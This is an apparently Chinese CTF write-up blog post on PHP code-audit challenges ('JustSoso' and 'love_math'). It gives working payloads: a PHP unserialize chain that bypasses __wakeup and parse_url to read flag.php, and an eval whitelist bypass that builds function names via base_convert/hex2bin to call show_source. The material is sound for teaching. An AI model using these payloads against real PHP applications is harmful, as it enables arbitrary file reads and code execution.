+O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}}
+b8497c82c6a0f5500969492ca7a7572b;</code></pre><p>最后的32位md5值为<code>md5(EzblrbNSa:5:{s:10:&quot;ses...)</code></p>
+<p><img src="https://i.imgur.com/oxZELKr.png" alt></p>
+<h3 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>根据php://filter伪协议，可以读取到hint.php和index.php源码</p>
+<p>index.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">    	    <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">    	    <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>意思：</p>
+<p>1.用get方式传递file和payload这两个参数</p>
+<p>2.file参数中不能出现<code>flag</code>；file会被文件包含</p>
+<p>3.请求的url会被parse_url解析，相关函数：</p>
+<blockquote>parse_url — 解析 URL，返回其组成部分     
+本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</blockquote>
+
+<p>数组中可能的键有以下几种：</p>
+<ul>
+<li>scheme - 如 http  </li>
+<li>host  </li>
+<li>port  </li>
+<li>user  </li>
+<li>pass  </li>
+<li>path  </li>
+<li>query - 在问号 ? 之后  </li>
+<li>fragment - 在散列符号 # 之后 </li>
+</ul>
+<p>如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'https://www.baidu.com/abcd?a=1'</span>;</span><br><span class="line">var_dump(parse_url($url));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出：array(4) &#123; ["scheme"]=&gt; string(5) "https" ["host"]=&gt; string(13) "www.baidu.com" ["path"]=&gt; string(5) "/abcd" ["query"]=&gt; string(3) "a=1" &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>4.如果请求的url的参数部分没有出现<code>flag</code>，则进行反序列化payload</p>
+<p>hint.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>意思：</p>
+<p>1.定义了Handle类和Flag类，其中，Flag类定义了getFlag方法，在两个随机数的md5相等时调用highlight_file函数，可以任意读取文件；Handle类销毁时会调用这个方法</p>
+<p>2.反序列化时会先调用__wakeup魔法方法，相关函数：</p>
+<blockquote>get_object_vars — 返回由对象属性组成的关联数组</blockquote>
+
+<p>即反序列化Handle类时会将$handle属性置空</p>
+<hr>
+<p>思路：</p>
+<p>1.file参数设为hint.php，将Handle类和Flag类包含进来</p>
+<p>2.由于需要读取flag.php(猜测)，则需要绕过parse_url；</p>
+<p>在host后多加两个斜杠，会使parse_url解析失败：</p>
+<p>sql.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">print_r(parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/cY2KMoG.png" alt></p>
+<p>3.需要绕过</p>
+<pre><code>if($this-&gt;token === $this-&gt;token_flag)</code></pre><p>可以通过变量引用的方式；</p>
+<blockquote>在PHP 中引用的意思是：不同的名字访问同一个变量内容</blockquote>
+
+<p>如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line">$b = &amp;$a;</span><br><span class="line">$a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出：2</span></span><br></pre></td></tr></table></figure>
+
+<p>4.需要绕过Handle类中的<code>__wakeup()</code>，当构造的序列化字符串的类的属性个数大于真实属性个数时，反序列化时会跳过<code>__wakeup()</code>执行</p>
+<p>5.构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Flag(<span class="string">'flag.php'</span>);</span><br><span class="line">$a-&gt;token=&amp;$a-&gt;token_flag;</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Handle($a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<pre><code>O:6:&quot;Handle&quot;:1:{s:14:&quot;&lt;0x00&gt;Handle&lt;0x00&gt;handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;2ecd2bd94734e5dd392d8678bc64cdab&quot;;s:10:&quot;token_flag&quot;;R:4;}}</code></pre><p>在Handle类中，$handle属性为私有属性，参考<a href="https://www.cnblogs.com/wayne173/p/3747465.html" target="_blank" rel="noopener">文章</a>：</p>
+<blockquote>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上 
+\0declared class name\0 
+的前缀。这里 declared class name 表示的是声明该私有字段的类的类名;\0 表示 ASCII 码为 0 的字符</blockquote>
+
+<p>因此，传参时需要url编码为”%00Handle%00handle”</p>
+<p>最终payload：</p>
+<pre><code>///?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;b77375f945f272a2084c0119c871c13c&quot;;s:10:&quot;token_flag&quot;;R:4;}}</code></pre><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>session 文件包含，参考：<br><a href="https://www.ctfwp.com/articals/2019national.html#justsoso" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019national.html#justsoso</a></p>
+<h3 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h3><p>注：比赛时php版本为7.2.17，在本地复现php版本低于7.0会出现解析错误</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//例子 c=20-1</span></span><br><span class="line">        $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">        $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">        preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);</span><br><span class="line">        <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//帮你算出答案</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码分析：</p>
+<p>1.黑名单</p>
+<pre><code>if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) </code></pre><p>2.白名单</p>
+<pre><code>preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs);
+foreach ($used_funcs[0] as $func) {
+    if (!in_array($func, $whitelist)) {
+        die(&quot;请不要输入奇奇怪怪的函数&quot;);
+    }
+}</code></pre><p>其中：</p>
+<ul>
+<li>[] 表示单个字符的原子表，例如<code>[a-zA-Z0-9]</code>表示任意一位大小字母或数字 </li>
+<li><code>*</code> 表示任意次</li>
+<li>$used_funcs存储所有匹配到的结果，$used_funcs[0]将包含完整模式匹配到的文本</li>
+</ul>
+<p>即匹配到所有的：第一位字符为大小写英文字母、下划线、0x7f到0xff，第二位字符为大小写英文字母、下划线、数字、0x7f到0xff；第三位字符重复…</p>
+<p>将这些匹配到的字符放到$used_funcs[0]数组中，并遍历这个数组，看里面的字符串是否在白名单里面，如果不在则退出脚本</p>
+<p>也表明，可以传入的字符有：<code>$</code>、<code>（</code>、<code>）</code>、<code>;</code>、<code>{</code>、<code>}</code>…</p>
+<hr>
+<p>思路：</p>
+<p>数学函数表：<a href="http://www.w3school.com.cn/php/php_ref_math.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/php_ref_math.asp</a></p>
+<p>1.有个<code>base_convert</code>函数，可以将数字转换成字母，从而可以构造出其他函数：</p>
+<blockquote>base_convert — 在任意进制之间转换数字
+
+<p>string base_convert( string $number, int $frombase, int $tobase)</p>
+<p>返回一字符串，包含 number 以 tobase 进制的表示。number 本身的进制由 frombase 指定。frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。 </p></blockquote><p></p>
+<p>在线进制转换网站：<a href="http://www.atool9.com/hexconvert.php" target="_blank" rel="noopener">http://www.atool9.com/hexconvert.php</a></p>
+<p>36进制的<code>phpinfo</code>的10进制为<code>55490343972</code>，则构造payload：</p>
+<pre><code>c=base_convert(55490343972,10,36)()</code></pre><p>可以看到成功输出了phpinfo信息：</p>
+<p><img src="https://i.imgur.com/FeGjeXc.png" alt></p>
+<p>2.但不能只依赖base_convert函数，因为需要读取的<code>flag.php</code>这个字符串是它构造不出来的，它只能转换为数字和字母</p>
+<p>能够将数字转换为字符串的函数处了base_convert，还有hex2bin，但这个函数是白名单里面没有的，因此需要用base_convert去构造</p>
+<ul>
+<li>hex2bin 16进制转换为2进制字符串</li>
+</ul>
+<p>这里2进制字符串也就相当于二进制ASCII码对应的字符串</p>
+<p>16进制中也含有字母，因此需要用dechex函数将10进制转换为16进制而不是直接用16进制</p>
+<ul>
+<li>dechex 十进制转换为十六进制</li>
+<li>所能转换的最大数值为十进制的 PHP_INT_MAX * 2 + 1 (或 -1)：在 32 位平台上是十进制的 4294967295，其 dechex() 的结果为 ffffffff</li>
+</ul>
+<p>因此构造流程为：</p>
+<pre><code>10进制数由dechex函数转换为16进制数--》16进制数再由hex2bin函数转换为字符串</code></pre><p>如果要直接构造读取flag.php，那么思路就是：</p>
+<ul>
+<li>用base_convert构造出hex2bin</li>
+<li>用dechex构造出<code>readfile(&#39;flag.php&#39;)</code></li>
+</ul>
+<p>因此payload是这样的：</p>
+<pre><code>c=base_convert(37907361743,10,36)(dechex(186061670364112526798887))</code></pre><p>但用PHP会解析失败，原因是数字太大了…</p>
+<p>3.由于有白名单正则匹配，参数<code>c</code>中不允许出现除了数学函数外的其他字母，因此要想办法利用其他参数：用$_GET函数，接收其他参数，来完成flag文件的读取</p>
+<p>有两个知识：</p>
+<ul>
+<li>PHP可变变量，一个变量的值作为另一个变量的名：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'hello'</span>;</span><br><span class="line">$$a = <span class="string">'world'</span>;</span><br><span class="line"><span class="keyword">echo</span> $$a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出 world</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>PHP大括号的使用；因为一般取数组的某个值时使用中括号，这里中括号是被过滤了的，但可以使用大括号：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = array(&apos;a&apos; =&gt; &apos;b&apos;);</span><br><span class="line">echo $a&#123;a&#125;;</span><br><span class="line">?&gt;</span><br><span class="line">//输出 b</span><br></pre></td></tr></table></figure>
+
+<p>这时候虽然大括号里面没有用引号将下标引起来，报出Notice，但是会输出结果；这点与中括号一样</p>
+<p>4.构造思路如下：</p>
+<ul>
+<li>参数<code>c</code>中产生$_GET函数($_POST)，并且接受两个参数，一个参数值是文件名<code>flag.php</code>，另一个参数值是读取源码的函数，如highlight_file，show_source，readfile，system(cat flag.php)</li>
+<li>由于参数<code>c</code>中不能出现非白名单函数字母，因此接收的参数名可以为白名单的数学函数名、数字</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$abs = <span class="string">'flag.php'</span>;</span><br><span class="line">$pow = <span class="string">'show_source'</span>;</span><br><span class="line">$c = <span class="string">"</span></span><br><span class="line"><span class="string">$pi='_GET';</span></span><br><span class="line"><span class="string">$$pi&#123;pow&#125;($$pi&#123;abs&#125;)</span></span><br><span class="line"><span class="string">"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里为什么不能让<code>$pi=&#39;$_GET&#39;</code>?因为这样的话$pi就成了一个字符串了，而不是成为超全局数组变量</p>
+<p>5.将参数<code>c</code>中的非白名单字符串，即<code>_GET</code>用base_convert函数与dechex函数进行转换(为什么不能直接用base_convert转换？因为该字符串存在下划线，不属于36进制内)：</p>
+<p>首先用base_convert构造出hex2bin：</p>
+<pre><code>base_convert(37907361743,10,36)</code></pre><p>之后将_GET转换为16进制：</p>
+<pre><code>5f474554</code></pre><p>再将16进制转为10进制：</p>
+<pre><code>1598506324</code></pre><p>则参数<code>c</code>的payload：</p>
+<pre><code>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs})</code></pre><p>最终payload：</p>
+<pre><code>?abs=flag.php&amp;pow=show_source&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs})</code></pre>
+      
+    </div>
+    
+    
+    
+
+  <div>
+    
+      ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+  </div>
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="gtfly 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/aipay.jpg" alt="gtfly 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    gtfly
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2019/05/10/DD-国赛-PHP代码审计/" title="DD && 国赛 PHP代码审计">http://yoursite.com/2019/05/10/DD-国赛-PHP代码审计/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/09/Linux-curl/" rel="next" title="Linux curl">
+                <i class="fa fa-chevron-left"></i> Linux curl
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/10/HTTP认证/" rel="prev" title="HTTP认证">
+                HTTP认证 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">gtfly</p>
+              <p class="site-description motion-element" itemprop="description">轻描时光漫长低唱语焉不详.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">148</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.bugku.com/login?next=challenges" title="Bugku" target="_blank">Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://new.bugku.com/" title="new Bugku" target="_blank">new Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
